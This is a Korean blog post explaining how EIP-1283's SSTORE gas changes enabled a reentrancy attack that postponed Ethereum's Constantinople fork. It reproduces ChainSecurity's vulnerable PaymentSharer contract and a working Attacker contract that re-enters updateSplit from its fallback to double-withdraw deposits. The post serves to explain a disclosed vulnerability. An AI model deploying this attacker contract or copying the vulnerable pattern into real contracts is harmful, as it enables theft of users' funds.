@@ -1,0 +1,290 @@
+---
+layout: post
+title: "Security Alert: Ethereum Constantinople Postponement"
+date: 2019-02-09
+img: coex.jpg # Add image post (optional)
+description: # Add post description (optional)
+tag: [Ethereum, EIP-1283, Constantinople, Solidity]
+---
+
+올해 초 2019년 1월 16일 수요일 쯤, 블록 번호 7,080,000 부터 업그레이드될 예정이었던 이더리움 콘스탄티노플(Constantinople) 하드 포크가 보안상의 이유로 연기되었습니다. 
+[이더리움 블로그][etheruem-blog]를 통해 하드포크의 공식 발표, 그리고 ChainSecurity에 의해 제기된 보안 이슈로 인한 하드포크 연기 등 일련의 사건 진행상황을 알 수 있었습니다.
+
+이더리움의 궁극적인 목표인 Serenity로 가기 위해 중요한 시작점이 될 이번 하드포크가 연기된 이유는 적용 대상이었던 이더리움 개선 제안(EIP)들 
+중 [EIP-1283][eip-1283]에 "reentrancy"라고 알려진 보안 취약점이 발견되었기 때문입니다.
+
+EIP-1283의 내용은, 간단히 말하면, 이더리움의 EVM이 데이터를 저장할 때 지불해야 하는 사용료(usage)에 대한 변경이었습니다. EIP-1283의 배경에는 그 저장 비용이 
+비합리적이라는 문제가 있었습니다.
+
+이더리움의 기술 문서인 [옐로우 페이퍼][etheruem-yellowpaper]에는 데이터 저장 opcode인 `SSTORE`에 소요되는 가스를 다음과 같이 정의하고 있습니다.
+
+
+>20000 Paid for an SSTORE operation when the storage value is set to non-zero from zero.
+<br/>
+5000 Paid for an SSTORE operation when the storage value's zeroness remains unchanged or is set to zero.
+<br/>
+15000 Refund given (added into refund counter) when the storage value is set to zero from non-zero.
+
+의역하면 최초 인서트할 때 20,000 gas를 내야하고 그 값을 업데이트할 때는 5,000 gas, 그리고 NULL로 만들면 15,000 gas를 되돌려 준다는 말이 되겠습니다.  
+
+이더리움은 32바이트 크기의 "슬롯"이라는 저장 단위를 가지고 있습니다. 슬롯에 데이터를 저장하는 비용은 20,000 gas인데, 32바이트 크기를 고려할 때 꽤 비싸다고 할 수 있습니다(그래서 이더리움을 데이터베이스로 생각하고 발생하는 모든 트랜잭션 데이터를 저장하려는 것은 그리 좋은 생각이 아닙니다).  
+
+이렇게 "저장"이라는 기능에 고비용을 책정한 이유는 블록체인이 너무 많은 데이터를 들고 있는 것은 블록체인의 자원을 낭비하는 일이기 때문입니다.
+그러나 한 편에서는 다음과 같은 경우를 생각해볼 수 있습니다.
+
+> A contract with empty storage that increments slot 0 5 times will be charged 20000 + 5 * 5000 = 45000 gas, despite this sequence of operations requiring no more disk activity than a single write, charged at 20000 gas.  
+
+위의 예는 실제로 사용하는 슬롯은 하나인데 빈번한 업데이트로 인한 과도한 비용의 발생(excessive gas cost)은 비합리적이라는 말이 되겠습니다.
+
+
+## EIP 1283: Net gas metering for SSTORE without dirty maps 
+
+자, 그래서 EIP-1283의 제목과 같은 개선 요구가 제안되었습니다. "dirty"라는 의미는 (오라클의 dirty block 😉) 디스크에 기록된 것을 여러번 읽고 쓴다는 
+의미가 되겠습니다. 즉 "<i>without dirty maps</i>"이란 여러 번 써도 마치 한 번만 쓴 것처럼 "가스 계산(gas metering)"을 하도록 개선하려는 시도라고 할 수 있습니다.
+
+
+>This EIP proposes net gas metering changes for SSTORE opcode, enabling new usages for contract storage, and reducing excessive gas costs where it doesn’t match how most implementation works.
+
+>This acts as an alternative for EIP-1087, where it tries to be friendlier to implementations that use different optimization strategies for storage change caches.
+
+짐작컨데, 이러한 가스 비용은 이더리움 구현체-노드 마다 차이가 있었던 것 같습니다. 기존 구현체의 변경사항을 최소화하는 것을 고려하여 아래와 같은 정보를 
+사용하여 가스를 책정할 것입니다.
+
+* Storage slot’s original value.
+* Storage slot’s current value.
+* Refund counter.
+
+EIP-1283은 이들 정보를 활용하여 다음 동작에 대해 합리적인 가스 비용을 "청구"할 수 있을 것이라고 제안했습니다. 앞서 언급한 잦은 업데이트로 인한 과도한 가스 소모를 
+개선하려는 목적을 포함해서 말입니다.
+
+* Subsequent storage write operations within the same call frame. This includes reentry locks, same-contract multi-send, etc.
+* Exchange storage information between sub call frame and parent call frame, where this information does not need to be persistent outside of a transaction. This includes sub-frame error codes and message passing, etc.
+
+로직은 다음과 같습니다. 우선 가스 비용 책정의 기준이 되는 정보들에 대한 정의입니다.
+
+* Storage slot’s <b>original value</b>: This is the value of the storage if a reversion happens on the current transaction.
+* Storage slot’s <b>current value</b>: This is the value of the storage before SSTORE operation happens.
+* Storage slot’s <b>new value</b>: This is the value of the storage after SSTORE operation happens.
+
+<ul>
+<li>초기 값(original value)이란 트랜잭션이 롤백되었을 때 복원되는 값을 말합니다.</li>
+<li>현재 값(current value)이란 SSTORE가 실행되기 전의 값을 말합니다.</li>
+<li>변경 값(new value)이란 SSTORE가 실행된 후의 값을 말합니다.</li>
+</ul>
+
+다시 말해서 트랜잭션에 의해 저장 슬롯의 값을 여러 번 변경될 수 있는데, 그렇게 변경되는 값의 성격을 구분하여 가스 소모를 차등 적용하겠다는 의미가 되겠습니다. 
+이제 현재 값과 새로운 값의 일치 여부를 구분하여 다음과 같이 분기합니다.
+
+<b>(1) If current value equals new value (this is a no-op), 200 gas is deducted.</b> 
+
+현재 값이 변경 값과 같으면(no-op), 200 gas를 공제합니다.
+
+<b>(2) If current value does not equal new value</b> 
+
+현재 값이 변경 값과 같지 않은 경우에는 다음과 같이 분기합니다.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(2.1) If original value equals current value (this storage slot has not been changed by the current execution context)
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 초기 값과 현재 값이 같다면(값이 바뀐 적이 없는 경우)
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.1.1) If original value is 0, 20000 gas is deducted.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 초기 값이 0이었다면 20000 gas를 공제합니다. 이 경우는 최초로 슬롯에 0이 아닌 값을 저장하는 경우가 되겠습니다.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.1.2) Otherwise, 5000 gas is deducted. If new value is 0, add 15000 gas to refund counter.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 그렇지 않으면 5000 gas를 공제합니다. 새로운 값이 0이라면 15000 gas를 되돌려 줍니다. 
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2) If original value does not equal current value (this storage slot is dirty), 200 gas is deducted.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 초기 값이 현재 값과 같지 않다면(값이 바뀐 적이 있는 경우, dirty slot) 200 gas를 공제합니다. 
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 이 경우에는 아래 조건에 의해 가스를 환원 처리합니다.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.1) If original value is not 0
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 초기 값이 0이 아니라면
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.1.A) If current value is 0 (also means that new value is not 0), remove 15000 gas from refund counter. 
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 현재 값이 0이면 공제된 15000 gas를 삭제합니다. 현재 값이 0이라면 전에 15000 gas를 되돌려 받았다는 것을 의미합니다.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.1.B) If new value is 0 (also means that current value is not 0), add 15000 gas to refund counter.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 변경 값이 0이라면 15000 gas를 되돌려 줍니다.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.2) If original value equals new value (this storage slot is reset)
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 초기 값과 변경 값이 같다면(스토리지 리셋)
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.2.A) If original value is 0, add 19800 gas to refund counter.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 초기 값이 0이라면 19800 gas를 되돌려 줍니다.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.2.B)  Otherwise, add 4800 gas to refund counter.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 그렇지 않으면 4800 gas를 되돌려줍니다.
+
+케이스별로 복잡하게 분기되어 있지만 SSTORE가 다음과 같은 슬롯 상태에 적용되는 경우를 나누어 생각한 것으로 볼 수 있습니다.
+
+* <b>No-op</b>: the virtual machine does not need to do anything. This is the case if current value equals new value.
+* <b>Fresh</b>: this storage slot has not been changed, or has been reset to its original value. This is the case if current value does not equal new value, and original value equals current value.
+* <b>Dirty</b>: this storage slot has already been changed. This is the case if current value does not equal new value, and original value does not equal current value.
+
+No-op는 현재 값을 동일한 값으로 변경하는 것이므로 사실상 EVM은 아무것도 할 필요가 없는 경우입니다. Fresh는 처음 사용, 또는 리셋이 된 상태입니다. Dirty는 적어도 한 번 이상 사용된, 이미 변경 값으로 업데이트된 경우라고 할 수 있습니다. 결과적으로 이러한 차등 조건에 따라 가스를 환원하여 과도한 가스 소모를 막는 것이 EIP-1283의 원래 목적이었습니다.
+
+그럼 앞에서 언급한 문제를 다시 예로 들어 가스 소모량 45000에서 얼마나 절약되는지 살펴보겠습니다. 최초 쓰기는 20000 gas가 소모되고 그 이후로 변경 값으로 업데이트할 때마다 200 gas가 적용될 것입니다.
+
+> A contract with empty storage that increments slot 0 5 times will be charged 20000 + 5 * 200 = 21000 gas
+
+
+### What’s wrong with this code?
+
+이제 ChainSecurity가 발견한 EIP-1283이 가진 [보안 취약성 문제][eip-1283-reentrancy]를 살펴보겠습니다. EIP-1283이 적용되었을 경우에 발생하는 "reentrancy"가 발생하는 컨트랙트를 예로 들고 있습니다.
+
+{% highlight javascript %}
+
+pragma solidity ^0.5.0;
+
+contract PaymentSharer {
+      
+      mapping(uint => uint) splits;
+      mapping(uint => uint) deposits;
+      mapping(uint => address payable) first;
+      mapping(uint => address payable) second;
+    
+      function init(uint id, address payable _first, address payable _second) public {
+          require(first[id] == address(0) && second[id] == address(0));
+          require(first[id] == address(0) && second[id] == address(0));
+          first[id] = _first;
+          second[id] = _second;
+      }
+    
+      function deposit(uint id) public payable {
+          deposits[id] += msg.value;
+      }
+    
+      function updateSplit(uint id, uint split) public {
+          require(split <= 100);
+          splits[id] = split;
+      }
+    
+      function splitFunds(uint id) public {
+          // Here would be: 
+          // Signatures that both parties agree with this split
+    
+          // Split
+          address payable a = first[id];
+          address payable b = second[id];
+          uint depo = deposits[id];
+          deposits[id] = 0;
+    
+          a.transfer(depo * splits[id] / 100);
+          b.transfer(depo * (100 - splits[id]) / 100);
+      }
+}
+{% endhighlight %}
+
+이 컨트랙트는 `init()` 함수에서 _first와 _second 계정을 파라미터로 전달받아서 특정 아이디를 키로 하여 mapping 타입의 상태 변수 first와 second와 각각 저장합니다.
+`deposit()` 함수를 통해서 컨트랙트에 이더를 적립합니다. 적립된 이더는 deposits라는 mapping 타입의 장부에 저장됩니다.
+
+`updateSplit()`는 이렇게 적립된 이더를 _first와 _second 계정에게 배분하는 비율을 정하는 함수입니다. _first 계정이 가져갈 비율을 %단위로 지정하면 나머지는 
+_second 계정이 받게 될 것입니다. `splitFunds()`는 그렇게 계산된 이더를 송금하는 함수입니다. 
+
+다음에는 공격자 컨트랙트입니다.
+
+{% highlight javascript %}
+
+pragma solidity ^0.5.0;
+
+import "./PaymentSharer.sol";
+
+contract Attacker {
+      address private victim;
+      address payable owner;
+    
+      constructor() public {
+          owner = msg.sender;
+      }
+    
+      function attack(address a) external {
+          victim = a;
+          PaymentSharer x = PaymentSharer(a);
+          x.updateSplit(0, 100);
+          x.splitFunds(0);
+      }
+    
+      function () payable external {
+          address x = victim;
+          assembly{
+              mstore(0x80, 0xc3b18fb600000000000000000000000000000000000000000000000000000000)
+              pop(call(10000, x, 0, 0x80, 0x44, 0, 0))
+          }    
+      }
+    
+      function drain() external {
+          owner.transfer(address(this).balance);
+      }
+}
+{% endhighlight %}
+
+여느 공격자 컨트랙트가 그렇듯이, 공격대상이 되는 PaymentSharer.sol 컨트랙트를 참조합니다. 공격자는 각각 _first, _second 컨트랙트 계정을 
+만들어서 정상적으로 임의의 이더를 이 컨트랙트에 적립합니다.
+
+이제 `attack()`함수를 실행합니다. 이 함수는 연속적으로, 하나의 트랜잭션으로 실행됩니다. Attacker 컨트랙트가 _first 계정이 될 것입니다.
+
+1. 공격자는 `updateSplit()`을 실행하여 0번 아이디 배분 장부에 _first계정이 100%의 이더를 가져가도록 합니다.
+
+2. 공격자는 `splitFunds()`를 호출하여 송금을 진행합니다.
+
+3. 송금되는 이더는 공격자의 컨트랙트 Attacker, 즉 _first 계정이 받게 되는데 이 때 fallback payable 함수가 호출됩니다. 여기서 다시 `updateSplit()`으로 
+이번에는 _first 계정에 0% 배분을 지정하여 _second 계정이 이더를 모두 받도록 합니다(여기서는 솔리디티 어셈블리를 사용하여 함수 시그너처 0xc3b18fb6 = bytes4(keccak256("updateSplit(uint256,uint256)")) 호출하였습니다). 
+ 
+4. `splitFunds()`는 아직 실행중이고 상태 변수 splits이 변경되면서 _second 계정으로도 100% 배분이 다시 송금됩니다.
+
+요약하면, 이미 _first 계정에 100%의 이더가 모두 전송되었음에도 공격자의 fallback 함수에서 `updateSplit()`을 다시 호출하면서(reentrancy) 두 번째 계정에게도 100%의 
+이더를 전송하도록 하는 결과가 되는 것입니다. <b>다시 말해서 이더를 한 번 더 인출할 수 있게 되는 것입니다(이중 송금인 셈입니다).</b> 
+물론 _second 계정에게 전송되는 이더는 공격자가 정사적으로 적립한 이더가 아닙니다!😈
+
+
+### Why is this attackable now?
+
+과거 reentrancy와 다른 점이 무엇일까요? reentrancy 공격은 `msg.sender.call.value(_amount)()`으로 이더를 전송하면서 
+여분의 가스가 forward 되는 부작용을 이용했다면 이번에는 transfer를 사용했습니다. transfer를 사용하는 송금의 특징은 컨트랙트 계정이 fallback 함수를 호출하면 fallback 함수에 남은 가스가 
+forward되지 않고 "stipend" 2300 gas로 고정됩니다(메타마스크에서 컨트랙트에 이더를 전송하는 경우와는 다릅니다).  
+
+만약에 EIP-1283이 적용되는 경우에는 어떻게 될까요? EIP-1283의 로직을 다시 보겠습니다.
+
+>(2.2) If original value does not equal current value (this storage slot is dirty), 200 gas is deducted.
+
+이 경우에 초기 값은 0입니다. 최초 splits에 기록된 값은 100입니다. 그렇다면 두 번째 호출, 공격자의 fallback 함수에서 splits을 0으로 업데이트한다면? 그렇습니다. 위의 로직에 의해 
+200 gas가 소모 됩니다. 이것은 fallback에서 stipend 2300 gas로 고정되더라도 다른 함수를 호출할 수 있는 충분한 가스입니다. 
+더구나 (2.2.2.A)에 의해 나중에 19800 gas도 되돌려 받을 것입니다.
+
+>(2.2.2.A) If original value is 0, add 19800 gas to refund counter.
+
+EIP-1283으로 인하여 이렇게 공격자 컨트랙트에게는 2300 gas를 보안 취약성을 가진 컨트랙트의 상태를 변경시키는데 사용할 수 있는 여분의 가스를 주는 셈이 된 것입니다.
+
+그러나 EIP-1283가 적용되기 전에는 상태 값을 업데이트하는 경우 5000 gas가 사용됩니다. 당연히 가스가 모자르기 때문에 롤백이 되면서 실행은 중단될 것이고 _first에게 송금되었던 이더의 
+트랜잭션도 실패할 것입니다.
+
+이러한 공격이 가능한 조건은 다음과 같이 정리할 수 있습니다. ChainSecurity가 분석한 내용을 그대로 인용합니다.
+
+>1. There must be a function A, in which a transfer/send is followed by a state-changing operation. This can sometimes be non-obvious, e.g. a second transfer or an interaction with another smart contract.
+2. There has to be a function B accessible from the attacker which (a) changes state and (b) whose state changes conflict with those of function A.
+3. Function B needs to be executable with less than 1600 gas(2300 gas stipend - 700 gas for the CALL). 
+
+
+결국 예정되었던 콘스탄티노플 하드포크는 연기되었고 보도된 바에 따르면 2월 25일(잠정적인 계획) 블록번호 7,280,000부터 페테르부르크(Petersburg) 포크와 함께 콘스탄티노플을 시행할 것이라고 합니다.
+다시 말하면 EIP-1283을 포함하여 콘스탄티노플로 업그레이드 하고 페테르부르크 포크에서 이슈가 된 부분을 비활성화시키는 순서로 진행할 예정이라고 합니다. 
+
+이더리움 커뮤니티에서는 이러한 보안 이슈에 대해서 여러 의견이 제시되는 것 같습니다. EIP-1283을 적용하고 SSTORE에 가스가 2300보다 작아지면 롤백시키는 조건을 추가하자는 의견도 
+있습니다. 즉 2300 gas를 상태를 변경하는데 사용할 수 없도록 하자는 것입니다. 아예 EIP-1283을 폐기하자는 의견, 그렇게 opcode를 손대지 않고 가스 비용을 절감할 수 있는 
+다른 EIP를 고려하자는 등의 의견도 있습니다.
+
+참고로 EIP-1283이 반영된 가나슈가 배포되고 있습니다. GUI버전은 1.3.0인데 위에 있는 컨트랙트를 사용하여 reentrancy 문제를 확인해볼 수 있습니다.
+
+[etheruem-blog]: https://blog.ethereum.org/
+[eip-1283]: https://eips.ethereum.org/EIPS/eip-1283
+[etheruem-yellowpaper]: https://github.com/ethereum/yellowpaper
+[eip-1283-reentrancy]: https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9
